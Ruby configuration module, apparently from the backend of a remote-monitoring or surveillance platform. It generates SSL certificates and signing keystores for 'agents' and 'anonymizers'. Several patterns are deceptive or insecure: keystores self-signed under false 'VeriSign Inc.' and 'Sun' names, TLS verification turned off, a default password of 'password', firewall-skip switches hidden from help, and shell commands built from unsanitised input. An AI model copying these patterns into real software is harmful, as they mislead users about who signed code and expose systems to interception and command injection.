#
#  Configuration parsing module
#

# from RCS::Common
require 'rcs-common/trace'

require_relative 'indexer'
require_relative 'migration'

# system
require 'yaml'
require 'pp'
require 'optparse'
require 'rbconfig'

module RCS
module DB

class Config
  include Singleton
  include Tracer

  CONF_DIR = 'config'
  CERT_DIR = CONF_DIR + '/certs'
  CONF_FILE = 'config.yaml'

  DEFAULT_CONFIG = {'CN' => '127.0.0.1',
                    'CA_PEM' => 'rcs.pem',
                    'DB_CERT' => 'rcs-db.crt',
                    'DB_KEY' => 'rcs-db.key',
                    'CERT_PASSWORD' => 'password',
                    'LISTENING_PORT' => 443,
                    'HB_INTERVAL' => 15,
                    'BACKUP_DIR' => 'backup',
                    'POSITION' => true,
                    'PERF' => false,
                    'SLOW' => 0,
                    'SHARD' => 'shard0000'}

  attr_reader :global

  $execution_directory ||= File.expand_path('../../../', __FILE__)

  def initialize
    @global = {}
  end

  def check_certs
    unless @global['DB_CERT'].nil?
      unless File.exist?(Config.instance.cert('DB_CERT'))
        trace :fatal, "Cannot open certificate file [#{@global['DB_CERT']}]"
        return false
      end
    end

    unless @global['DB_KEY'].nil?
      unless File.exist?(Config.instance.cert('DB_KEY'))
        trace :fatal, "Cannot open private key file [#{@global['DB_KEY']}]"
        return false
      end
    end

    unless @global['CA_PEM'].nil?
      unless File.exist?(Config.instance.cert('CA_PEM'))
        trace :fatal, "Cannot open PEM file [#{@global['CA_PEM']}]"
        return false
      end
    end

    return true
  end

  def load_from_file
    #trace :info, "Loading configuration file..."
    conf_file = File.join $execution_directory, CONF_DIR, CONF_FILE

    # load the config in the @global hash
    begin
      File.open(conf_file, "rb") do |f|
        @global = YAML.load(f.read)
      end
    rescue
      trace :fatal, "Cannot open config file [#{conf_file}]"
      return false
    end

    # to avoid problems with checks too frequent
    if @global['HB_INTERVAL'] and @global['HB_INTERVAL'] < 10
      trace :fatal, "Interval too short, please increase it"
      return false
    end

    if Config.instance.global['BACKUP_DIR'].nil?
      trace :fatal, "Backup dir not configured, please configure it"
      return false
    end

    # default password if not configured in the config file
    Config.instance.global['CERT_PASSWORD'] ||= 'password'

    return true
  end

  def temp_folder_name
    'temp'
  end

  def temp(name=nil)
    temp = File.join $execution_directory, temp_folder_name
    temp = File.join temp, name if name
    return temp
  end
  
  def file(name)
    return File.join $execution_directory, CONF_DIR, @global[name].nil? ? name : @global[name]
  end

  def cert(name)
    return File.join $execution_directory, CERT_DIR, @global[name].nil? ? name : @global[name]
  end

  def is_slow?(time)
    return false if @global['SLOW'].nil? || @global['SLOW'] == 0
    return time > @global['SLOW']
  end

  def save_to_file
    conf_file = File.join $execution_directory, CONF_DIR, CONF_FILE

    # Write the @global into a yaml file
    begin
      File.open(conf_file, "wb") do |f|
        f.write(@global.to_yaml)
      end
    rescue
      trace :fatal, "Cannot write config file [#{conf_file}]"
      return false
    end

    return true
  end

  def run(options)

    if options[:reset]
      reset_admin options
      return 0
    end

    $version = File.read(file('VERSION'))

    # migration
    return Migration.up_to $version if options[:migrate]

    return Migration.run [:cleanup_storage] if options[:cleanup]

    # keyword indexing
    return Indexer.run options[:kw_index] if options[:kw_index]

    # load the current config
    load_from_file

    if options[:add_skip_firewall_check]
      @global.merge!('SKIP_FIREWALL_CHECK' => true)
      save_to_file
      return 0
    end

    if options[:remove_skip_firewall_check]
      @global.reject! { |key| key == 'SKIP_FIREWALL_CHECK' }
      save_to_file
      return 0
    end

    if options[:get_cn]
      print @global['CN']
      return 0
    end

    if options[:shard]
      add_shard options
      return 0
    end

    trace :info, ""
    trace :info, "Previous configuration:"
    trace :info, PP.pp(@global, "")

    # use the default values
    if options[:defaults]
      @global = DEFAULT_CONFIG
    end

    # values taken from command line
    @global['CN'] = options[:cn] unless options[:cn].nil?
    @global['CA_PEM'] = options[:ca_pem] unless options[:ca_pem].nil?
    @global['DB_CERT'] = options[:db_cert] unless options[:db_cert].nil?
    @global['DB_KEY'] = options[:db_key] unless options[:db_key].nil?
    @global['CERT_PASSWORD'] = options[:pfx_pass] unless options[:pfx_pass].nil?
    @global['LISTENING_PORT'] = options[:port] unless options[:port].nil?
    @global['HB_INTERVAL'] = options[:hb_interval] unless options[:hb_interval].nil?
    @global['BACKUP_DIR'] = options[:backup] unless options[:backup].nil?
    @global['SMTP'] = options[:smtp] unless options[:smtp].nil?
    @global['SMTP_FROM'] = options[:smtp_from] unless options[:smtp_from].nil?
    @global['SMTP_USER'] = options[:smtp_user] unless options[:smtp_user].nil?
    @global['SMTP_PASS'] = options[:smtp_pass] unless options[:smtp_pass].nil?
    @global['SMTP_AUTH'] = options[:smtp_auth] unless options[:smtp_auth].nil?
    @global['SMTP_STARTTLS'] = options[:smtp_starttls] unless options[:smtp_starttls].nil?

    # changing the CN is a risky business :)
    if options[:newcn]
      # change the command line of the RCS Master Router service accordingly to the new CN
      change_router_service_parameter
      # change the address of the first shard in the mongodb
      change_first_shard_address
    end

    generate_certificates(options) if options[:gen_cert]
    generate_certificates_anon if options[:gen_cert_anon]

    generate_keystores if options[:gen_keystores]

    use_pfx_cert(options[:pfx_cert]) if options[:pfx_cert]
    use_pfx_winphone(options[:pfx_winphone]) if options[:pfx_winphone]
    use_aetx_winphone(options[:aetx_winphone]) if options[:aetx_winphone]

    if options[:shard_failure_add]
      shard, host = options[:shard_failure_add].split(':')
      Shard.add(shard, host)
      trace :info, "\n*** Please restart all the services.\n"
    end
    
    if options[:shard_failure_del]
      Shard.remove options[:shard_failure_del]
      trace :info, "\n*** Please restart all the services.\n"
    end
    
    trace :info, ""
    trace :info, "Current configuration:"
    trace :info, PP.pp(@global, "")

    # save the configuration
    save_to_file

    return 0
  end

  def reset_admin(options)
    trace :info, "Resetting 'admin' password..."

    http = Net::HTTP.new(options[:db_address] || '127.0.0.1', options[:db_port] || 443)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    resp = http.request_post('/auth/reset', {pass: options[:reset]}.to_json, nil)
    trace :info, resp.body
  end

  def add_shard(options)
    trace :info, "Adding this host as db shard..."

    http = Net::HTTP.new(options[:db_address] || '127.0.0.1', options[:db_port] || 443)
    http.use_ssl = true
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # login
    account = {:user => options[:user], :pass => options[:pass] }
    resp = http.request_post('/auth/login', account.to_json, nil)
    if resp['Set-Cookie'].nil?
      trace :fatal, "Invalid authentication"
      return
    else
      cookie = resp['Set-Cookie']
    end

    # send the request
    res = http.request_post('/shard/create', {host: options[:shard]}.to_json, {'Cookie' => cookie})
    trace :info, res.body
    shard = JSON.parse(res.body)

    @global['SHARD'] = shard['shardAdded']

    # save the configuration
    save_to_file

    # logout
    http.request_post('/auth/logout', nil, {'Cookie' => cookie})
  end

  def generate_certificates(options)
    trace :info, "Generating ssl certificates..."

    # ensure dir is present
    FileUtils.mkdir_p File.join($execution_directory, CERT_DIR)

    Dir.chdir File.join($execution_directory, CERT_DIR) do

      File.open('index.txt', 'wb+') { |f| f.write '' }
      File.open('serial.txt', 'wb+') { |f| f.write '01' }

      # to create the CA
      if options[:gen_ca] or !File.exist?('rcs-ca.crt')
        trace :info, "Generating a new CA authority..."
        # default one
        subj = "/CN=\"Root Certification Authority\"/O=\"ACME Corp\""
        # if specified...
        subj = "/CN=\"#{options[:ca_name]}\"" if options[:ca_name]
        out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-ca.key -out rcs-ca.crt -config openssl.cnf 2>&1`
        trace :info, out if $log
      end

      raise("Missing file rcs-ca.crt") unless File.exist? 'rcs-ca.crt'

      trace :info, "Generating db certificate..."
      # the cert for the db server
      out = `openssl req -subj /CN=#{@global['CN']} -batch -days 3650 -nodes -new -keyout #{@global['DB_KEY']} -out rcs-db.csr -config openssl.cnf 2>&1`
      trace :info, out if $log

      raise("Missing file #{@global['DB_KEY']}") unless File.exist? @global['DB_KEY']

      trace :info, "Generating collector certificate..."
      # the cert used by the collectors
      out = `openssl req -subj /CN=collector -batch -days 3650 -nodes -new -keyout rcs-collector.key -out rcs-collector.csr -config openssl.cnf 2>&1`
      trace :info, out if $log

      raise("Missing file rcs-collector.key") unless File.exist? 'rcs-collector.key'

      trace :info, "Signing certificates..."
      # signing process
      out = `openssl ca -batch -days 3650 -out #{@global['DB_CERT']} -in rcs-db.csr -extensions server -config openssl.cnf 2>&1`
      trace :info, out if $log

      out = `openssl ca -batch -days 3650 -out rcs-collector.crt -in rcs-collector.csr -config openssl.cnf 2>&1`
      trace :info, out if $log

      raise("Missing file #{@global['DB_CERT']}") unless File.exist? @global['DB_CERT']

      trace :info, "Creating certificates bundles..."
      File.open(@global['DB_CERT'], 'ab+') {|f| f.write File.read('rcs-ca.crt')}

      # create the PEM file for all the collectors
      File.open(@global['CA_PEM'], 'wb+') do |f|
        f.write File.read('rcs-collector.crt')
        f.write File.read('rcs-collector.key')
        f.write File.read('rcs-ca.crt')
      end

      trace :info, "Removing temporary files..."
      # CA related files
      ['index.txt', 'index.txt.old', 'index.txt.attr', 'index.txt.attr.old', 'serial.txt', 'serial.txt.old'].each do |f|
        File.delete f
      end

      # intermediate certificate files
      ['01.pem', '02.pem', 'rcs-collector.csr', 'rcs-collector.crt', 'rcs-collector.key', 'rcs-db.csr'].each do |f|
        File.delete f
      end

    end
    trace :info, "done."
  end

  def generate_certificates_anon
    trace :info, "Generating anon ssl certificates..."

    # ensure dir is present
    FileUtils.mkdir_p File.join($execution_directory, CERT_DIR)

    Dir.chdir File.join($execution_directory, CERT_DIR) do

      File.open('index.txt', 'wb+') { |f| f.write '' }
      File.open('serial.txt', 'wb+') { |f| f.write '01' }

      trace :info, "Generating a new Anon CA authority..."
      subj = "/CN=\"#{SecureRandom.urlsafe_base64(20)[0..10]}\""
      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -x509 -keyout rcs-anon-ca.key -out rcs-anon-ca.crt -config openssl.cnf 2>&1`
      trace :info, out if $log

      raise('Missing file rcs-anon-ca.crt') unless File.exist? 'rcs-anon-ca.crt'

      trace :info, "Generating anonymizer certificate..."
      subj = "/CN=\"#{SecureRandom.urlsafe_base64(20)[0..10]}\""
      out = `openssl req -subj #{subj} -batch -days 3650 -nodes -new -keyout rcs-anon.key -out rcs-anon.csr -config openssl.cnf 2>&1`
      trace :info, out if $log

      raise('Missing file rcs-anon.key') unless File.exist? 'rcs-anon.key'
      raise('Missing file rcs-anon.csr') unless File.exist? 'rcs-anon.csr'

      trace :info, "Signing certificates..."
      out = `openssl ca -batch -days 3650 -out rcs-anon.crt -in rcs-anon.csr -config openssl.cnf -name CA_network 2>&1`
      trace :info, out if $log

      raise('Missing file rcs-anon.crt') unless File.exist? 'rcs-anon.crt'

      trace :info, "Creating certificates bundles..."

      # create the PEM file for all the collectors
      File.open('rcs-network.pem', 'wb+') do |f|
        f.write File.read('rcs-anon.crt')
        f.write File.read('rcs-anon.key')
        f.write File.read('rcs-anon-ca.crt')
      end

      trace :info, "Removing temporary files..."
      # CA related files
      ['index.txt', 'index.txt.old', 'index.txt.attr', 'serial.txt', 'serial.txt.old', 'rcs-anon-ca.crt', 'rcs-anon-ca.key',].each do |f|
        File.delete f
      end

      # intermediate certificate files
      ['01.pem', 'rcs-anon.csr', 'rcs-anon.crt', 'rcs-anon.key'].each do |f|
        File.delete f
      end
    end
    trace :info, "done."
  end


  def generate_keystores
    trace :info, "Generating key stores for Java Applet..."
    FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
    out = `keytool -genkey -alias signapplet -dname \"CN=VeriSign Inc., O=Default, C=US\" -validity 18250 -keystore #{Config.instance.cert('applet.keystore')} -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log

    trace :info, "Generating key stores for Android..."
    FileUtils.rm_rf(Config.instance.cert('android.keystore'))
    out = `keytool -genkey -dname \"cn=Server, ou=JavaSoft, o=Sun, c=US\" -alias ServiceCore -keystore #{Config.instance.cert('android.keystore')} -keyalg RSA -keysize 2048 -validity 18250 -keypass #{Config.instance.global['CERT_PASSWORD']} -storepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log
  end

  def use_pfx_cert(pfx)
    trace :info, "Using pfx cert for windows code signing..."
    FileUtils.cp pfx, Config.instance.cert("windows.pfx")

    trace :info, "Using pfx cert to create Java Applet keystore..."
    FileUtils.rm_rf(Config.instance.cert('applet.keystore'))
    out = `openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain 2>&1`
    trace :info, out if $log

    out = `openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name signapplet -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log

    out = `keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('applet.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log

    trace :info, "Using pfx cert to create Android keystore..."
    FileUtils.rm_rf(Config.instance.cert('android.keystore'))
    out = `openssl pkcs12 -in #{pfx} -out pfx.pem -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} -chain 2>&1`
    trace :info, out if $log

    out = `openssl pkcs12 -export -in pfx.pem -out pfx.p12 -name ServiceCore -passin pass:#{Config.instance.global['CERT_PASSWORD']} -passout pass:#{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log

    out = `keytool -importkeystore -srckeystore pfx.p12 -destkeystore #{Config.instance.cert('android.keystore')} -srcstoretype pkcs12 -deststoretype JKS -srcstorepass #{Config.instance.global['CERT_PASSWORD']} -deststorepass #{Config.instance.global['CERT_PASSWORD']} 2>&1`
    trace :info, out if $log

    # remove temporary files
    ['pfx.pem', 'pfx.p12'].each do |f|
      File.delete f
    end
  end

  def use_pfx_winphone(pfx)
    trace :info, "Using pfx cert for windows phone code signing..."
    FileUtils.cp pfx, Config.instance.cert("winphone.pfx")
  end

  def use_aetx_winphone(aetx)
    trace :info, "Using aetx cert for windows phone code signing..."
    FileUtils.cp aetx, Config.instance.cert("winphone.aetx")
  end

  def change_router_service_parameter
    return unless RbConfig::CONFIG['host_os'] =~ /mingw/
    trace :info, "Changing the startup option of the Router Master"
    Win32::Registry::HKEY_LOCAL_MACHINE.open('SYSTEM\CurrentControlSet\services\RCSMasterRouter', Win32::Registry::Constants::KEY_ALL_ACCESS) do |reg|
      original_value = reg['ImagePath']
      new_value = original_value.gsub(/--configdb [^ ]*/, "--configdb #{@global['CN']}")
      reg['ImagePath'] = new_value
    end
  rescue Exception => e
    trace :fatal, "ERROR: Cannot write registry: #{e.message}"
  end

  def change_first_shard_address
    trace :info, "Changing the address of shard0000 to #{@global['CN']}"
    ret = Shard.update('shard0000', @global['CN'])
    trace :fatal, "Cannot update shard0000: #{ret['errmsg']}" if ret['ok'] != 1
    trace :info, "Remember to restart the Master services..."
  end

  def self.mongo_exec_path(file)
    # select the correct dir based upon the platform we are running on
    case RbConfig::CONFIG['host_os']
      when /darwin/
        os = 'macos'
        ext = ''
      when /mingw/
        os = 'win'
        ext = '.exe'
    end

    return $execution_directory + '/mongodb/' + os + '/' + file + ext
  end

  def self.file_path(file)
    return file if File.file?(file)
    return File.join($invocation_directory, file)
  end

  # executed from rcs-db-config
  def self.run!(*argv)
    # reopen the class and declare any empty trace method
    # if called from command line, we don't have the trace facility
    self.class_eval do
      def trace(level, message)
        puts message
        File.open(File.join($execution_directory, "log/rcs-db-config.log"), 'a') {|f| f.write "#{Time.now} [#{level}] #{message}\n"} if $log
      end
    end

    # This hash will hold all of the options parsed from the command-line by OptionParser.
    options = {}

    optparse = OptionParser.new do |opts|
      # Set a banner, displayed at the top of the help screen.
      opts.banner = "Usage: rcs-db-config [options]"

      opts.separator ""
      opts.separator "Application layer options:"
      opts.on( '-l', '--listen PORT', Integer, 'Listen on tcp/PORT' ) do |port|
        options[:port] = port
      end
      opts.on( '-b', '--db-heartbeat SEC', Integer, 'Time in seconds between two heartbeats' ) do |sec|
        options[:hb_interval] = sec
      end
      opts.on( '-n', '--CN CN', String, 'Common Name for the server' ) do |cn|
        options[:cn] = cn
      end
      opts.on( '--get-cn', 'Print the current CN for the master') do
        options[:get_cn] = true
      end
      opts.on( '-N', '--new-CN', 'Use this option to update the CN in the db and registry' ) do
        options[:newcn] = true
      end

      opts.separator ""
      opts.separator "Certificates options:"
      opts.on( '-G', '--generate-ca', 'Generate a new CA authority for SSL certificates' ) do
        options[:gen_ca] = true
      end
      opts.on( '-A', '--anon-ca NAME', String, 'Generate an anonymous CA (you specify the name)' ) do |name|
        options[:ca_name] = name
      end
      opts.on( '-g', '--generate-certs', 'Generate the SSL certificates needed by the system' ) do
        options[:gen_cert] = true
      end
      opts.on( '-a', '--generate-certs-anon', 'Generate the SSL certificates used by anonymizers' ) do
        options[:gen_cert_anon] = true
      end
      opts.on( '-c', '--ca-pem FILE', 'The certificate file (pem) of the issuing CA' ) do |file|
        options[:ca_pem] = file
      end
      opts.on( '-t', '--db-cert FILE', 'The certificate file (crt) used for ssl communication' ) do |file|
        options[:db_cert] = file
      end
      opts.on( '-k', '--db-key FILE', 'The certificate file (key) used for ssl communication' ) do |file|
        options[:db_key] = file
      end
      opts.on( '-K', '--generate-keystores', 'Generate new self-signed key stores used for building vectors' ) do
        options[:gen_keystores] = true
      end
      opts.on('--sign-pass PASSWORD', String, 'Password for all pfx certificate(s)' ) do |pass|
        options[:pfx_pass] = pass
      end
      opts.on('--sign-pfx FILE', String, 'Use this certificate (pfx) to sign the windows and android agents' ) do |file|
        options[:pfx_cert] = file_path(file)
      end
      opts.on('--sign-pfx-winphone FILE', String, 'Use this certificate (pfx) to sign the winphone agent' ) do |file|
        options[:pfx_winphone] = file_path(file)
      end
      opts.on('--sign-aetx-winphone FILE', String, 'Use this certificate (aetx) for winphone agent' ) do |file|
        options[:aetx_winphone] = file_path(file)
      end


      opts.separator ""
      opts.separator "Alerting options:"
      opts.on( '-M', '--mail-server HOST:PORT', String, 'Use this mail server to send the alerting mails' ) do |smtp|
        options[:smtp] = smtp
      end
      opts.on( '-f', '--mail-from EMAIL', String, 'Use this sender for alert emails' ) do |from|
        options[:smtp_from] = from
      end
      opts.on( '--mail-user USER', String, 'Use this username to authenticate alert emails' ) do |user|
        options[:smtp_user] = user
      end
      opts.on( '--mail-pass PASS', String, 'Use this password to authenticate alert emails' ) do |pass|
        options[:smtp_pass] = pass
      end
      opts.on( '--mail-auth TYPE', String, 'SMTP auth type: (plain, login or cram_md5)' ) do |auth|
        options[:smtp_auth] = auth
      end
      opts.on( '--mail-tls BOOL', String, 'SMTP STARTTLS (enabled or disabled)' ) do |tls|
        options[:smtp_starttls] = (tls.downcase.eql? 'true') ? true : false
      end

      opts.separator ""
      opts.separator "General options:"
      opts.on( '-X', '--defaults', 'Write a new config file with default values' ) do
        options[:defaults] = true
      end
      opts.on( '--add-skip-firewall-check', 'Add SKIP_FIREWALL_CHECK to the configuration params') do
        options[:add_skip_firewall_check] = true
      end
      opts.on( '--remove-skip-firewall-check', 'Remove SKIP_FIREWALL_CHECK from the configuration params' ) do
        options[:remove_skip_firewall_check] = true
      end
      opts.on( '-B', '--backup-dir DIR', String, 'The directory to be used for backups' ) do |dir|
        options[:backup] = dir
      end
      opts.on( '--index TARGET', String, 'Calculate the full text index for this target' ) do |target|
        options[:kw_index] = target
      end
      opts.on( '--migrate', 'Migrate data to the new version' ) do
        options[:migrate] = true
      end
      opts.on( '--log', 'Log all operation to a file' ) do
        $log = true
      end
      opts.on( '-h', '--help', 'Display this screen' ) do
        puts opts
        return 0
      end

      opts.separator ""
      opts.separator "Utilities:"
      opts.on( '-u', '--user USERNAME', 'rcs-db username' ) do |user|
        options[:user] = user
      end
      opts.on( '-p', '--password PASSWORD', 'rcs-db password' ) do |password|
        options[:pass] = password
      end
      opts.on( '-d', '--db-address HOSTNAME', 'Use the rcs-db at HOSTNAME' ) do |host|
        options[:db_address] = host
      end
      opts.on( '-P', '--db-port PORT', Integer, 'Connect to tcp/PORT on rcs-db' ) do |port|
        options[:db_port] = port
      end
      opts.on( '-R', '--reset-admin PASS', 'Reset the password for user \'admin\'' ) do |pass|
        options[:reset] = pass
      end
      opts.on( '-S', '--add-shard ADDRESS', 'Add ADDRESS as a db shard (sys account required)' ) do |shard|
        options[:shard] = shard
      end
      opts.on( '-Z', '--remove-shard SHARD', 'Remove SHARD in case of failure.') do |shard|
        options[:shard_failure_del] = shard
      end
      opts.on( '-W', '--restore-shard SHARD:HOST', 'Restore SHARD after failure.') do |params|
        options[:shard_failure_add] = params
      end
      opts.on( '--cleanup', 'Cleanup the db by deleting dangling entries') do
        options[:cleanup] = true
      end
      opts.on("-h", "--help", "Display this help") do
        hidden_switches = ["--add-skip-firewall-check", "--remove-skip-firewall-check"]
        puts opts.to_s.split("\n").delete_if { |line| hidden_switches.find{|s| line =~ /#{s}/} }.join("\n")
        exit
      end
    end

    optparse.parse(argv)

    # execute the configurator
    return Config.instance.run(options)
  end

end #Config

end #DB::
end #RCS::